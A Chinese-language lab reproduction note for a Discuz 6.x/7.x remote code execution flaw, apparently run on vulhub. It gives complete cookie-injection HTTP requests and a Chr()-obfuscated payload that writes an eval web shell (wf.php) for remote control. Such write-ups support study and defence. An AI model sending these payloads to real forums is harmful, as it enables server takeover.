# 0x00 软件介绍
Discuz：一款流行的论坛程序

# 0x01 复现环境
使用环境：vulhub中的环境  
复现版本：无

# 0x02 环境搭建
靶机环境：2008_r2_standard_zh-chs

切换到对应目录下  
docker-compose up -d  
启动后，访问[http://172.16.35.128:8080/install/](http://172.16.35.128:8080/install/)来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root

# 0x03 利用条件
无

# 0x04 影响版本
Discuz 7.x 6.x

# 0x05 漏洞复现
攻击环境：kali_x64_en-us

安装成功后，直接找一个已存在的帖子，向其发送数据包，将Cookie中的数据改为
```
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo()
```
请求如下
```
GET /viewthread.php?tid=13&extra=page%3D1 HTTP/1.1
Host: 172.16.35.128:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.35.128:8080/forumdisplay.php?fid=2&page=1
Connection: close
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo()
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```
返回如下图  
![image](./0.png)  

想getshell可将Cookie中的内容变为  
```
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
```
发送的请求如下  
```
GET /viewthread.php?tid=13&extra=page%3D1 HTTP/1.1
Host: 172.16.35.128:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.35.128:8080/forumdisplay.php?fid=2&page=1
Connection: close
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```
然后可使用蚁剑连接，地址http://172.16.35.128:8080/wf.php 密码lalala

# 0x06 踩坑记录
无

# 0x07 参考链接
无
